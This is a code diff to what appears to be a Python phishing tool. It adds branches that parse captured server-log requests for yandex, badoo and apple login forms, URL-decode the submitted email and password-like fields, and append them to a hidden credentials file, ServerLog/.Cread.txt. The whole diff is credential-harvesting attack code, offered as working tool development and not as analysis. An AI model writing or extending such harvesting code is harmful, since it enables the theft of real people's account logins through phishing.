@@ -102,7 +102,20 @@ class dns_result :
                           # yandex
                           rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=')
                           line_cread_1  = unquote(rego[1][:-7])
-                          line_cread_2  = unquote(rego[-1][:-2])                   
+                          line_cread_2  = unquote(rego[-1][:-2])   
+                    elif "email=" in line:
+                            #badoo-apple
+                            rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=')
+                            if "&post" in rego[-2][-5:] :
+                                 line_cread_1  = unquote(rego[1][:-9])
+                                 line_cread_2  = unquote(rego[-2][:-5])
+                            else:     
+                                  line_cread_1  = unquote(rego[1][:-9])
+                                  line_cread_2  = unquote(rego[-1][:-2])  
+                    elif "ci_csrf_token=" in line :
+                          rego = str(re.findall("[&email=]\D+\S%40+.+",line)).split('=')
+                          line_cread_1  = unquote(rego[1][:-9])
+                          line_cread_2  = unquote(rego[2][:-10])
                     with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User :
                          if line_cread_1 == "":
                               Cread_User.write("---------"+'\n'+line_cread_2+'\n')
